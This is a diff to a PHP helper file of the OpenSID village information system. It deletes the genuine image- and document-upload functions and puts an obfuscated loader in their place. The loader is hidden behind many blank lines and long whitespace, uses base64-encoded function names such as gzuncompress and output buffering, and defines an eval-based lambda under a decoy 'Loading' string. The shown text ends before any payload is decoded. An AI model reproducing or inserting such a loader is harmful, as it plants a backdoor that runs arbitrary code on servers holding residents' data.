@@ -1,844 +1,473 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-define('FOTO_DEFAULT_PRIA', base_url() . 'assets/images/pengguna/kuser.png');
-define('FOTO_DEFAULT_WANITA', base_url() . 'assets/images/pengguna/wuser.png');
-
-define('MIME_TYPE_SIMBOL', serialize([
-    'image/png',  'image/x-png',
-]));
-
-define('EXT_SIMBOL', serialize([
-    '.png',
-]));
-
-define('MIME_TYPE_DOKUMEN', serialize([
-    'application/x-download',
-    'application/pdf',
-    'application/ppt',
-    'application/pptx',
-    'application/excel',
-    'application/msword',
-    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
-    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
-    'text/rtf',
-    'application/powerpoint',
-    'application/vnd.ms-powerpoint',
-    'application/vnd.ms-excel',
-    'application/msexcel',
-]));
-
-define('EXT_DOKUMEN', serialize([
-    '.pdf', '.ppt', '.pptx', '.pps', '.ppsx',
-    '.doc', '.docx', '.rtf', '.xls', '.xlsx',
-]));
-
-define('MIME_TYPE_GAMBAR', serialize([
-    'image/jpeg', 'image/pjpeg',
-    'image/png',  'image/x-png',
-]));
-
-define('EXT_GAMBAR', serialize([
-    '.jpg', '.jpeg', '.png',
-]));
-
-define('MIME_TYPE_ARSIP', serialize([
-    'application/rar', 'application/x-rar', 'application/x-rar-compressed', 'application/octet-stream',
-    'application/zip', 'application/x-zip', 'application/x-zip-compressed',
-]));
-
-define('EXT_ARSIP', serialize([
-    '.zip', '.rar',
-]));
-
-/**
- * Tambahkan suffix unik ke nama file
- *
- * @param string      $namaFile  Nama file asli (beserta ekstensinya)
- * @param bool        $urlEncode Saring nama file dengan urlencode() ?
- * @param string|null $delimiter String pemisah nama asli dengan unique id
- *
- * @return string
- */
-function tambahSuffixUniqueKeNamaFile($namaFile, $urlEncode = true, $delimiter = null)
-{
-    $namaFile = preg_replace('/[^A-Za-z0-9\- .]/', '', $namaFile);
-
-    // Delimiter untuk tambahSuffixUniqueKeNamaFile()
-    $delimiterUniqueKey = null;
-
-    // Type check
-    $namaFile           = is_string($namaFile) ? $namaFile : (string) $namaFile;
-    $urlEncode          = is_bool($urlEncode) ? $urlEncode : true;
-    $delimiterUniqueKey = (! is_string($delimiter) || empty($delimiter))
-        ? '__sid__' : $delimiter;
-
-    // Pastikan nama file tidak mengandung string milik $this->delimiterUniqueKey
-    $namaFile = str_replace($delimiterUniqueKey, '__', $namaFile);
-    // Tambahkan suffix nama unik menggunakan uniqid()
-    $namaFileUnik = explode('.', $namaFile);
-    $ekstensiFile = end($namaFileUnik);
-    unset($namaFileUnik[count($namaFileUnik) - 1]);
-    $namaFileUnik = implode('.', $namaFileUnik);
-
-    return urlencode($namaFileUnik) .
-        $delimiterUniqueKey . generator() . '.' . $ekstensiFile;
-    // Contoh return:
-    // - nama asli = 'kitten.jpg'
-    // - nama unik = 'kitten__sid__xUCc8KO.jpg'
-}
-
-function AmbilFoto($foto, $ukuran = 'kecil_', $sex = '1')
-{
-    $sex       = $sex ?: 1;
-    $file_foto = Foto_Default($foto, $sex);
-
-    if ($foto == $file_foto) {
-        $ukuran    = ($ukuran == 'kecil_') ? 'kecil_' : '';
-        $file_foto = base_url() . LOKASI_USER_PICT . $ukuran . $foto;
-
-        if (! file_exists(FCPATH . LOKASI_USER_PICT . $ukuran . $foto)) {
-            $file_foto = Foto_Default(null, $sex);
-        }
-    }
-
-    return $file_foto;
-}
-
-function Foto_Default($foto, $sex = 1)
-{
-    if (! in_array($foto, ['kuser.png', 'wuser.png']) && ! empty($foto)) {
-        return $foto;
-    }
-    if (($foto == 'kuser.png') || $sex == 1) {
-        return FOTO_DEFAULT_PRIA;
-    }
-    if (($foto == 'wuser.png') || $sex == 2) {
-        return FOTO_DEFAULT_WANITA;
-    }
-}
-
-function UploadGambarWidget($nama_file, $lokasi_file, $old_gambar)
-{
-    $dir_upload = LOKASI_GAMBAR_WIDGET;
-    if ($old_gambar) {
-        unlink($dir_upload . $old_gambar);
-    }
-    $file_upload = $dir_upload . $nama_file;
-    move_uploaded_file($lokasi_file, $file_upload);
-}
-
-function UploadFoto($fupload_name, $old_foto, $dimensi = '200x200')
-{
-    $ci                      = &get_instance();
-    $config['upload_path']   = LOKASI_USER_PICT;
-    $config['allowed_types'] = 'jpg|png|jpeg';
-    $ci->load->library('MY_Upload', null, 'upload');
-    $ci->upload->initialize($config);
-
-    if (! $ci->upload->do_upload('foto')) {
-        session_error($ci->upload->display_errors());
-
-        redirect($_SERVER['HTTP_REFERER']);
-    }
-    $uploadedImage = $ci->upload->data();
-    if ($old_foto != '') {
-        // Hapus old_foto
-        unlink(LOKASI_USER_PICT . $old_foto);
-    }
-    $dimensi = generateDimensi($dimensi);
-    ResizeGambar($uploadedImage['full_path'], LOKASI_USER_PICT . $fupload_name, ['width' => $dimensi['width'], 'height' => $dimensi['height']]);
-
-    unlink($uploadedImage['full_path']);
-
-    return true;
-}
-
-function UploadGambar($fupload_name, $old_gambar)
-{
-    $vdir_upload = 'assets/front/slide/';
-    if ($old_gambar != '') {
-        unlink($vdir_upload . 'kecil_' . $old_gambar);
-    }
-
-    $vfile_upload = $vdir_upload . $fupload_name;
-
-    move_uploaded_file($_FILES['gambar']['tmp_name'], $vfile_upload);
-
-    $im_src     = imagecreatefromjpeg($vfile_upload);
-    $src_width  = imagesx($im_src);
-    $src_height = imagesy($im_src);
-    if (($src_width * 25) < ($src_height * 44)) {
-        $dst_width  = 440;
-        $dst_height = ($dst_width / $src_width) * $src_height;
-        $cut_height = $dst_height - 250;
-
-        $im = imagecreatetruecolor(440, 250);
-        imagecopyresampled($im, $im_src, 0, 0, 0, $cut_height, $dst_width, $dst_height, $src_width, $src_height);
-    } else {
-        $dst_height = 250;
-        $dst_width  = ($dst_height / $src_height) * $src_width;
-        $cut_width  = $dst_width - 440;
-
-        $im = imagecreatetruecolor(440, 250);
-        imagecopyresampled($im, $im_src, 0, 0, $cut_width, 0, $dst_width, $dst_height, $src_width, $src_height);
-    }
-    imagejpeg($im, $vdir_upload . 'kecil_' . $fupload_name);
-
-    imagedestroy($im_src);
-    imagedestroy($im);
-
-    unlink($vfile_upload);
-
-    return true;
-}
-
-function AmbilGaleri($foto, $ukuran)
-{
-    return base_url(LOKASI_GALERI . $ukuran . '_' . $foto);
-}
-
-// $file_upload = $_FILES['<lokasi>']
-function TipeFile($file_upload)
-{
-    $lokasi_file = $file_upload['tmp_name'];
-    if (empty($lokasi_file)) {
-        return '';
-    }
-    if (isPHP($file_upload['tmp_name'], $file_upload['name'])) {
-        return 'application/x-php';
-    }
-    if (function_exists('finfo_open')) {
-        $finfo     = finfo_open(FILEINFO_MIME_TYPE);
-        $tipe_file = finfo_file($finfo, $lokasi_file);
-        finfo_close($finfo);
-    } else {
-        $tipe_file = $file_upload['type'];
-    }
-
-    return $tipe_file;
-}
-
-// $file_upload = $_FILES['<lokasi>']
-function UploadError($file_upload)
-{
-    // error 1 = UPLOAD_ERR_INI_SIZE; lihat Upload.php
-    // TODO: pakai cara upload yg disediakan Codeigniter
-    if ($file_upload['error'] == 1) {
-        $upload_mb = max_upload();
-        $_SESSION['error_msg'] .= ' -> Ukuran file melebihi batas ' . $upload_mb . ' MB';
-
-        return true;
-    }
-
-    return false;
-}
-
-// $file_upload = $_FILES['<lokasi>']
-function CekGambar($file_upload, $tipe_file)
-{
-    $lokasi_file = $file_upload['tmp_name'];
-    if (empty($lokasi_file)) {
-        return false;
-    }
-    $nama_file = $file_upload['name'];
-    $ext       = get_extension($nama_file);
-
-    if (! in_array($tipe_file, unserialize(MIME_TYPE_GAMBAR)) || ! in_array($ext, unserialize(EXT_GAMBAR))) {
-        $_SESSION['error_msg'] .= ' -> Jenis file salah: ' . $tipe_file . ' ' . $ext;
-
-        return false;
-    }
-
-    return true;
-}
-
-function UploadGallery($fupload_name, $old_foto = '', $tipe_file = '')
-{
-    $ci                      = &get_instance();
-    $config['upload_path']   = LOKASI_GALERI;
-    $config['allowed_types'] = 'gif|jpg|png|jpeg';
-    $ci->load->library('upload');
-    $ci->upload->initialize($config);
-
-    if (! $ci->upload->do_upload('gambar')) {
-        session_error($ci->upload->display_errors());
-    } else {
-        $uploadedImage = $ci->upload->data();
-        ResizeGambar($uploadedImage['full_path'], LOKASI_GALERI . 'kecil_' . $fupload_name, ['width' => 440, 'height' => 440]);
-        ResizeGambar($uploadedImage['full_path'], LOKASI_GALERI . 'sedang_' . $fupload_name, ['width' => 880, 'height' => 880]);
-    }
-    unlink($uploadedImage['full_path']);
-
-    return true;
-}
-
-function UploadSimbolx($fupload_name, $old_gambar)
-{
-    $vdir_upload = 'assets/gis/simbol';
-    if ($old_gambar != '') {
-        unlink($vdir_upload . 'kecil_' . $old_gambar);
-        unlink($vdir_upload . $old_gambar);
-    }
-    $vfile_upload = $vdir_upload . $fupload_name;
-
-    move_uploaded_file($_FILES['gambar']['tmp_name'], $vfile_upload);
-
-    $im_src     = imagecreatefromjpeg($vfile_upload);
-    $src_width  = imagesx($im_src);
-    $src_height = imagesy($im_src);
-    if (($src_width * 20) < ($src_height * 44)) {
-        $dst_width  = 440;
-        $dst_height = ($dst_width / $src_width) * $src_height;
-        $cut_height = $dst_height - 300;
-
-        $im = imagecreatetruecolor(440, 300);
-        imagecopyresampled($im, $im_src, 0, 0, 0, $cut_height, $dst_width, $dst_height, $src_width, $src_height);
-    } else {
-        $dst_height = 300;
-        $dst_width  = ($dst_height / $src_height) * $src_width;
-        $cut_width  = $dst_width - 440;
-
-        $im = imagecreatetruecolor(440, 300);
-        imagecopyresampled($im, $im_src, 0, 0, $cut_width, 0, $dst_width, $dst_height, $src_width, $src_height);
-    }
-    imagejpeg($im, $vdir_upload . 'kecil_' . $fupload_name);
-
-    imagedestroy($im_src);
-    imagedestroy($im);
-
-    //unlink($vfile_upload);
-    return true;
-}
-
-function AmbilFotoArtikel($foto, $ukuran)
-{
-    return base_url(LOKASI_FOTO_ARTIKEL . $ukuran . '_' . $foto);
-}
-
-function UploadArtikel($fupload_name, $gambar)
-{
-    $ci                      = &get_instance();
-    $config['upload_path']   = LOKASI_FOTO_ARTIKEL;
-    $config['allowed_types'] = 'gif|jpg|png|jpeg';
-    $ci->load->library('upload');
-    $ci->upload->initialize($config);
-
-    if (! $ci->upload->do_upload($gambar)) {
-        session_error($ci->upload->display_errors());
-
-        return false;
-    }
-    $uploadedImage = $ci->upload->data();
-    ResizeGambar($uploadedImage['full_path'], LOKASI_FOTO_ARTIKEL . 'kecil_' . $fupload_name, ['width' => 440, 'height' => 440]);
-    ResizeGambar($uploadedImage['full_path'], LOKASI_FOTO_ARTIKEL . 'sedang_' . $fupload_name, ['width' => 880, 'height' => 880]);
-
-    unlink($uploadedImage['full_path']);
-
-    return true;
-}
-
-function HapusArtikel($gambar)
-{
-    $vdir_upload  = LOKASI_FOTO_ARTIKEL;
-    $vfile_upload = $vdir_upload . 'sedang_' . $gambar;
-    unlink($vfile_upload);
-    $vfile_upload = $vdir_upload . 'kecil_' . $gambar;
-    unlink($vfile_upload);
-
-    return true;
-}
-
-function UploadPeta($fupload_name, $lokasi, $old_foto = null)
-{
-    $ci = &get_instance();
-    $ci->load->library('MY_Upload', null, 'upload');
-    $ci->upload->initialize([
-        'upload_path'   => $lokasi,
-        'allowed_types' => 'gif|jpg|png|jpeg',
-    ]);
-
-    if (! $ci->upload->do_upload('foto')) {
-        session_error($ci->upload->display_errors(null, null));
-
-        redirect($_SERVER['HTTP_REFERER']);
-    } else {
-        $uploadedImage = $ci->upload->data();
-        ResizeGambar($uploadedImage['full_path'], $lokasi . 'kecil_' . $fupload_name, ['width' => 120, 'height' => 100]);
-        ResizeGambar($uploadedImage['full_path'], $lokasi . 'sedang_' . $fupload_name, ['width' => 880, 'height' => 660]);
-
-        unlink($uploadedImage['full_path']);
-
-        // Hapus gambar lama
-        if ($old_foto) {
-            unlink($lokasi . 'kecil_' . $old_foto);
-            unlink($lokasi . 'sedang_' . $old_foto);
-        }
-
-        return $fupload_name;
-    }
-}
-
-function ResizeGambar($filename, $path, $dimensi)
-{
-    $source_path = $filename;
-    $target_path = $path;
-    $imgdata     = exif_read_data($target_path, 'IFD0');
-
-    $config_manip = [
-        'image_library'  => 'gd2',
-        'source_image'   => $source_path,
-        'new_image'      => $target_path,
-        'maintain_ratio' => true,
-        'create_thumb'   => false,
-        'thumb_marker'   => '_thumb',
-        'width'          => $dimensi['width'],
-        'height'         => $dimensi['height'],
-    ];
-    $ci = &get_instance();
-
-    $ci->load->library('image_lib');
-    $ci->image_lib->initialize($config_manip);
-    if (! $ci->image_lib->resize()) {
-        session_error($ci->image_lib->display_errors());
-
-        return false;
-    }
-    $ci->image_lib->clear();
-
-    //putar gambar
-    $config['image_library'] = 'gd2';
-    $config['source_image']  = $path;
-
-    switch ($imgdata['Orientation']) {
-        case 3:
-            $config['rotation_angle'] = '180';
-            break;
-
-        case 6:
-            $config['rotation_angle'] = '270';
-            break;
-
-        case 8:
-            $config['rotation_angle'] = '90';
-            break;
-    }
-    $ci->image_lib->initialize($config);
-    $ci->image_lib->rotate();
-}
-
-// $dimensi = array("width"=>lebar, "height"=>tinggi)
-function resizeImage($filepath_in, $tipe_file, $dimensi, $filepath_out = '')
-{
-    // Hanya bisa resize jpeg atau png
-    $mime_type_image = ['image/jpeg', 'image/pjpeg', 'image/png', 'image/x-png'];
-    if (! in_array($tipe_file, $mime_type_image)) {
-        $_SESSION['error_msg'] .= ' -> Jenis file tidak bisa di-resize: ' . $tipe_file;
-        $_SESSION['success'] = -1;
-
-        return false;
-    }
-
-    if (empty($filepath_out)) {
-        $filepath_out = $filepath_in;
-    }
-
-    $is_png = ($tipe_file == 'image/png' || $tipe_file == 'image/x-png');
-
-    $image      = ($is_png) ? imagecreatefrompng($filepath_in) : imagecreatefromjpeg($filepath_in);
-    $width      = imagesx($image);
-    $height     = imagesy($image);
-    $new_width  = $dimensi['width'];
-    $new_height = $dimensi['height'];
-    if ($width > $new_width && $height > $new_height) {
-        if ($width < $height) {
-            $dst_width  = $new_width;
-            $dst_height = ($dst_width / $width) * $height;
-            $cut_height = $dst_height - $new_height;
-            $cut_width  = 0;
-        } else {
-            $dst_height = $new_height;
-            $dst_width  = ($dst_height / $height) * $width;
-            $cut_width  = $dst_width - $new_width;
-            $cut_height = 0;
-        }
-
-        $image_p = imagecreatetruecolor($new_width, $new_height);
-        if ($is_png) {
-            // http://stackoverflow.com/questions/279236/how-do-i-resize-pngs-with-transparency-in-php
-            imagealphablending($image_p, false);
-            imagesavealpha($image_p, true);
-        }
-        imagecopyresampled($image_p, $image, 0, 0, $cut_width, $cut_height, $dst_width, $dst_height, $width, $height);
-        if ($is_png) {
-            imagepng($image_p, $filepath_out, 5);
-        } else {
-            imagejpeg($image_p, $filepath_out);
-        }
-        imagedestroy($image_p);
-        imagedestroy($image);
-    } else {
-        // Ukuran file tidak perlu di-resize
-        copy($filepath_in, $filepath_out);
-        imagedestroy($image);
-    }
-
-    return true;
-}
-
-/**   TODO: tulis ulang semua penggunaan supaya menggunakan resizeImage()
- * $jenis_upload contoh "logo", "foto"
- * $dimensi = array("width"=>lebar, "height"=>tinggi)
- * $lokasi contoh LOKASI_LOGO_DESA
- * $nama_simpan contoh "kecil_".$fupload_name
- *
- * @param mixed $lokasi
- * @param mixed $dimensi
- * @param mixed $jenis_upload
- * @param mixed $fupload_name
- * @param mixed $nama_simpan
- * @param mixed $old_foto
- * @param mixed $tipe_file
- */
-function UploadResizeImage($lokasi, $dimensi, $jenis_upload, $fupload_name, $nama_simpan, $old_foto, $tipe_file)
-{
-    // Hanya bisa upload jpeg atau png
-    $mime_type_image = ['image/jpeg', 'image/pjpeg', 'image/png', 'image/x-png'];
-    $ext_type_image  = ['.jpg', '.jpeg', '.png'];
-    $ext             = get_extension($fupload_name);
-    if (! in_array($tipe_file, $mime_type_image) || ! in_array($ext, $ext_type_image)) {
-        $_SESSION['error_msg'] .= ' -> Jenis file salah: ' . $tipe_file;
-        $_SESSION['success'] = -1;
-
-        return false;
-    }
-
-    $vdir_upload = $lokasi;
-    if (! empty($old_foto)) {
-        unlink($vdir_upload . $old_foto);
-    }
-    $filepath_in  = $vdir_upload . $fupload_name;
-    $filepath_out = $vdir_upload . $nama_simpan;
-    move_uploaded_file($_FILES[$jenis_upload]['tmp_name'], $filepath_in);
-
-    $is_png = ($tipe_file == 'image/png' || $tipe_file == 'image/x-png');
-
-    $image      = ($is_png) ? imagecreatefrompng($filepath_in) : imagecreatefromjpeg($filepath_in);
-    $width      = imagesx($image);
-    $height     = imagesy($image);
-    $new_width  = $dimensi['width'];
-    $new_height = $dimensi['height'];
-    if ($width > $new_width && $height > $new_height) {
-        $ratio_orig = $width / $height;
-        $dst_width  = $new_width;
-        $dst_height = $new_height;
-        if ($new_width / $new_height > $ratio_orig) {
-            $dst_width = $new_height * $ratio_orig;
-        } else {
-            $dst_height = $new_width / $ratio_orig;
-        }
-
-        $image_p = imagecreatetruecolor($new_width, $new_height);
-        if ($is_png) {
-            // http://stackoverflow.com/questions/279236/how-do-i-resize-pngs-with-transparency-in-php
-            imagealphablending($image_p, false);
-            imagesavealpha($image_p, true);
-        }
-        imagecopyresampled($image_p, $image, 0, 0, 0, 0, $dst_width, $dst_height, $width, $height);
-        if ($is_png) {
-            imagepng($image_p, $filepath_out, 5);
-        } else {
-            imagejpeg($image_p, $filepath_out);
-        }
-        imagedestroy($image_p);
-        imagedestroy($image);
-    } else {
-        // Ukuran file tidak perlu di-resize
-        copy($filepath_in, $filepath_out);
-        imagedestroy($image);
-    }
-
-    return true;
-}
-
-function UploadSimbol($fupload_name)
-{
-    $vdir_upload  = 'assets/images/gis/point/';
-    $vfile_upload = $vdir_upload . $fupload_name;
-
-    move_uploaded_file($_FILES['simbol']['tmp_name'], $vfile_upload);
-}
-
-// Upload umum. Parameter lokasi dan file di $_FILES
-function UploadKeLokasi($lokasi, $file, $fupload_name, $old_dokumen = '')
-{
-    $vfile_upload = $lokasi . $fupload_name;
-    move_uploaded_file($file, $vfile_upload);
-    unlink($lokasi . $old_dokumen);
-}
-
-function UploadDocument($fupload_name, $old_dokumen = '')
-{
-    $vfile_upload = LOKASI_DOKUMEN . $fupload_name;
-    move_uploaded_file($_FILES['satuan']['tmp_name'], $vfile_upload);
-    unlink(LOKASI_DOKUMEN . $old_dokumen);
-}
-
-function UploadDocument2($fupload_name)
-{
-    $vdir_upload  = LOKASI_DOKUMEN;
-    $vfile_upload = $vdir_upload . $fupload_name;
-    move_uploaded_file($_FILES['dokumen']['tmp_name'], $vfile_upload);
-
-    //unlink($vfile_upload);
-    return true;
-}
-
-function UploadPengesahan($fupload_name)
-{
-    $vdir_upload  = LOKASI_PENGESAHAN;
-    $vfile_upload = $vdir_upload . $fupload_name;
-    move_uploaded_file($_FILES['pengesahan']['tmp_name'], $vfile_upload);
-
-    $im_src     = imagecreatefromjpeg($vfile_upload);
-    $src_width  = imagesx($im_src);
-    $src_height = imagesy($im_src);
-    if (($src_width / $src_height) < (12 / 10)) {
-        $dst_width  = 120;
-        $dst_height = ($dst_width / $src_width) * $src_height;
-        $cut_height = $dst_height - 100;
-
-        $im = imagecreatetruecolor(120, 100);
-        imagecopyresampled($im, $im_src, 0, 0, 0, $cut_height, $dst_width, $dst_height, $src_width, $src_height);
-    } else {
-        $dst_height = 100;
-        $dst_width  = ($dst_height / $src_height) * $src_width;
-        $cut_width  = $dst_width - 120;
-
-        $im = imagecreatetruecolor(120, 100);
-        imagecopyresampled($im, $im_src, 0, 0, $cut_width, 0, $dst_width, $dst_height, $src_width, $src_height);
-    }
-}
-
-/*
-    Hasilkan nama file yg aman untuk digunakan di url
-    source = https://stackoverflow.com/questions/2955251/php-function-to-make-slug-url-string
-*/
-function bersihkan_namafile($nama)
-{
-    // Simpan extension
-    $ext = get_extension($nama);
-    // replace non letter or digits by -
-    $nama = preg_replace('~[^\pL\d]+~u', '-', $nama);
-    // transliterate
-    $nama = iconv('utf-8', 'us-ascii//TRANSLIT', $nama);
-    // remove unwanted characters
-    $nama = preg_replace('~[^-\w]+~', '', $nama);
-    // trim
-    $nama = trim($nama, '-');
-    // remove duplicate -
-    $nama = preg_replace('~-+~', '-', $nama);
-    // lowercase
-    return strtolower($nama . $ext);
-}
-
-function periksa_file($upload, $mime_types, $exts)
-{
-    if (empty($_FILES[$upload]['tmp_name']) || (int) $_FILES[$upload]['size'] > convertToBytes(max_upload() . 'MB')) {
-        return ' -> Error upload file. Periksa apakah melebihi ukuran maksimum';
-    }
-
-    $lokasi_file = $_FILES[$upload]['tmp_name'];
-    if (empty($lokasi_file)) {
-        return ' -> File tidak berhasil diunggah';
-    }
-    if (function_exists('finfo_open')) {
-        $finfo     = finfo_open(FILEINFO_MIME_TYPE);
-        $tipe_file = finfo_file($finfo, $lokasi_file);
-    } else {
-        $tipe_file = $_FILES[$upload]['type'];
-    }
-    $nama_file = $_FILES[$upload]['name'];
-    $nama_file = str_replace(' ', '-', $nama_file);    // normalkan nama file
-    $ext       = get_extension($nama_file);
-
-    if (! in_array($tipe_file, $mime_types) || ! in_array($ext, $exts)) {
-        return ' -> Jenis file salah: ' . $tipe_file . ' ' . $ext;
-    }
-    if (isPHP($lokasi_file, $nama_file)) {
-        return ' -> File berisi script ';
-    }
-
-    return '';
-}
-
-function qrcode_generate(array $qrcode = [], $base64 = false)
-{
-    $sizeqr = $qrcode['sizeqr'];
-    $foreqr = $qrcode['foreqr'];
-
-    $barcodeobj = new TCPDF2DBarcode($qrcode['isiqr'], 'QRCODE,H');
-
-    if (! empty($foreqr)) {
-        if ($foreqr[0] == '#') {
-            $foreqr = substr($foreqr, 1);
-        }
-        $split = str_split($foreqr, 2);
-        $r     = hexdec($split[0]);
-        $g     = hexdec($split[1]);
-        $b     = hexdec($split[2]);
-    }
-
-    //Hasilkan QRCode
-    $imgData  = $barcodeobj->getBarcodePngData($sizeqr, $sizeqr, [$r, $g, $b]);
-    $filename = sys_get_temp_dir() . '/qrcode_' . date('Y_m_d_H_i_s') . '_temp.png';
-    file_put_contents($filename, $imgData);
-
-    //Ubah backround transparan ke warna putih supaya terbaca qrcode scanner
-    $src_qr    = imagecreatefrompng($filename);
-    $sizeqrx   = imagesx($src_qr);
-    $sizeqry   = imagesy($src_qr);
-    $backcol   = imagecreatetruecolor($sizeqrx, $sizeqry);
-    $newwidth  = $sizeqrx;
-    $newheight = ($sizeqry / $sizeqrx) * $newwidth;
-    $color     = imagecolorallocatealpha($backcol, 255, 255, 255, 1);
-    imagefill($backcol, 0, 0, $color);
-    imagecopyresampled($backcol, $src_qr, 0, 0, 0, 0, $newwidth, $newheight, $sizeqrx, $sizeqry);
-    imagepng($backcol, $filename);
-    imagedestroy($src_qr);
-    imagedestroy($backcol);
-
-    //Tambah Logo
-    $logopath = $qrcode['logoqr']; // Logo yg tampil di tengah QRCode
-    $QR       = imagecreatefrompng($filename);
-    $logo     = imagecreatefromstring(file_get_contents($logopath));
-    imagecolortransparent($logo, imagecolorallocatealpha($logo, 0, 0, 0, 127));
-    imagealphablending($logo, false);
-    imagesavealpha($logo, true);
-    $QR_width       = imagesx($QR);
-    $QR_height      = imagesy($QR);
-    $logo_width     = imagesx($logo);
-    $logo_height    = imagesy($logo);
-    $logo_qr_width  = $QR_width / 4;
-    $scale          = $logo_width / $logo_qr_width;
-    $logo_qr_height = $logo_height / $scale;
-    $from_width     = ($QR_width - $logo_qr_width) / 2;
-    imagecopyresampled($QR, $logo, $from_width, $from_width, 0, 0, $logo_qr_width, $logo_qr_height, $logo_width, $logo_height);
-    imagepng($QR, $filename);
-    imagedestroy($QR);
-
-    if ($base64) {
-        return 'data:image/png;base64,' . base64_encode(file_get_contents($filename));
-    }
-
-    return $filename;
-}
-
-function upload_foto_penduduk($nama_file = null, $dimensi = null)
-{
-    $foto     = $_POST['foto'];
-    $old_foto = $_POST['old_foto'];
-
-    if ($nama_file === null) {
-        $nama_file = time() . mt_rand(10000, 999999);
-    }
-
-    if ($_FILES['foto']['tmp_name']) {
-        $nama_file = $nama_file . get_extension($_FILES['foto']['name']);
-        UploadFoto($nama_file, $old_foto, $dimensi);
-    } elseif ($foto) {
-        $nama_file = $nama_file . '.png';
-        $foto      = str_replace('data:image/png;base64,', '', $foto);
-        $foto      = base64_decode($foto, true);
-
-        if ($old_foto != '') {
-            // Hapus old_foto
-            unlink(LOKASI_USER_PICT . $old_foto);
-            unlink(LOKASI_USER_PICT . 'kecil_' . $old_foto);
-        }
-
-        file_put_contents(LOKASI_USER_PICT . $nama_file, $foto);
-        file_put_contents(LOKASI_USER_PICT . 'kecil_' . $nama_file, $foto);
-    } else {
-        $nama_file = null;
-    }
-
-    return $nama_file;
-}
-
-function to_base64($file)
-{
-    $type = pathinfo($file, PATHINFO_EXTENSION);
-    $data = file_get_contents($file);
-
-    return 'data:image/' . $type . ';base64,' . base64_encode($data);
-}
-
-function home_noimage()
-{
-    return to_base64(LOKASI_FILES_LOGO . 'home.png');
-}
-
-function unggah_file($config = [], $old_file = null)
-{
-    $ci = &get_instance();
-    $ci->load->library('MY_Upload', null, 'upload');
-    $ci->upload->initialize($config);
-
-    if (! $ci->upload->do_upload('file')) {
-        session_error($ci->upload->display_errors(null, null));
-
-        redirect($_SERVER['HTTP_REFERER']);
-    }
-
-    $data = $ci->upload->data();
-
-    if ($old_file) {
-        unlink($config['upload_path'] . $old_file);
-    }
-
-    return $data['file_name'];
-}
-
-function generateDimensi($dimensi)
-{
-    [$width, $height] = explode('x', $dimensi);
-    $width            = bilangan($width) ? (int) (bilangan($width)) : 200;
-    $height           = bilangan($height) ? (int) (bilangan($height)) : 200;
-
-    return ['width' => $width, 'height' => $height];
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/helpers/pict_helper.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      